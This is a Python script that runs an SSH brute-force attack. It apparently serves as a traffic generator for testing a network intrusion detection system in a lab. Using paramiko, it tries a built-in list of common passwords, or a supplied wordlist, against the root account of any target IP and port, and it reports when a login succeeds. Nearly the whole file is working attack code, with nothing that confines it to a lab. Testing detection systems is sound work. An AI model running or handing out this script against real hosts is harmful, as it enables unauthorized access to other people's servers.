#!/usr/bin/env python
"""
SSH Brute Force Attack
Attempts multiple password guesses against SSH
Should be detected as 'Brute Force' by your NIDS
"""

import sys
import time
import paramiko
import socket
from datetime import datetime

def ssh_brute_force(target_ip, target_port=22, username="root", word_list=None, delay=0.5):
    """
    SSH brute force attack - tries multiple passwords
    
    Args:
        target_ip: Target IP address
        target_port: SSH port (default 22)
        username: Username to attack (default root)
        word_list: List of passwords to try (default: common passwords)
        delay: Delay between attempts in seconds
    """
    
    if word_list is None:
        # Common passwords to try
        word_list = [
            "root", "password", "admin", "12345", "123456", "1234567", "12345678",
            "123456789", "password123", "letmein", "qwerty", "welcome", "monkey",
            "dragon", "master", "sunshine", "princess", "123123", "password1",
            "1q2w3e4r", "admin123", "root123", "test", "guest", "info", "support"
        ]
    
    print(f"\n{'='*60}")
    print(f"SSH Brute Force Attack")
    print(f"{'='*60}")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Username: {username}")
    print(f"Passwords to try: {len(word_list)}")
    print(f"\n[!] Starting SSH brute force...")
    print(f"[!] Your NIDS should show 'Brute Force'")
    print(f"{'='*60}\n")
    
    attempt_count = 0
    success_count = 0
    failed_count = 0
    
    for password in word_list:
        try:
            attempt_count += 1
            print(f"[*] Attempt {attempt_count}/{len(word_list)}: Trying '{username}':'{password}'...", end=" ", flush=True)
            
            # Create SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Attempt connection with timeout
            try:
                client.connect(
                    target_ip,
                    port=target_port,
                    username=username,
                    password=password,
                    timeout=3,
                    allow_agent=False,
                    look_for_keys=False
                )
                print("✓ SUCCESS!")
                success_count += 1
                client.close()
                break
            
            except paramiko.AuthenticationException:
                print("✗ (auth failed)")
                failed_count += 1
            except socket.timeout:
                print("✗ (timeout)")
                failed_count += 1
            except Exception as e:
                print(f"✗ ({str(e)[:30]})")
                failed_count += 1
            finally:
                try:
                    client.close()
                except:
                    pass
            
            # Delay between attempts
            time.sleep(delay)
        
        except KeyboardInterrupt:
            print("\n\n[!] Attack interrupted by user")
            break
        except Exception as e:
            print(f"\n[!] Error: {e}")
            break
    
    print(f"\n{'='*60}")
    print(f"[✓] SSH Brute Force complete!")
    print(f"    Total attempts: {attempt_count}")
    print(f"    Successful logins: {success_count}")
    print(f"    Failed attempts: {failed_count}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python 3_brute_force_ssh.py <TARGET_IP>")
        print("Example: python 3_brute_force_ssh.py 192.168.56.101")
        print("\nOptions:")
        print("  python 3_brute_force_ssh.py <IP> --port <PORT>")
        print("  python 3_brute_force_ssh.py <IP> --user <USERNAME>")
        print("  python 3_brute_force_ssh.py <IP> --wordlist <FILE>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    port = 22
    username = "root"
    wordlist_file = None
    
    # Parse optional arguments
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--user" and i + 1 < len(sys.argv):
            username = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--wordlist" and i + 1 < len(sys.argv):
            wordlist_file = sys.argv[i + 1]
            i += 2
        else:
            i += 1
    
    # Load wordlist if provided
    custom_wordlist = None
    if wordlist_file:
        try:
            with open(wordlist_file, 'r') as f:
                custom_wordlist = [line.strip() for line in f.readlines() if line.strip()]
            print(f"[+] Loaded {len(custom_wordlist)} passwords from {wordlist_file}")
        except Exception as e:
            print(f"[!] Error loading wordlist: {e}")
            sys.exit(1)
    
    ssh_brute_force(target_ip, port, username, custom_wordlist)
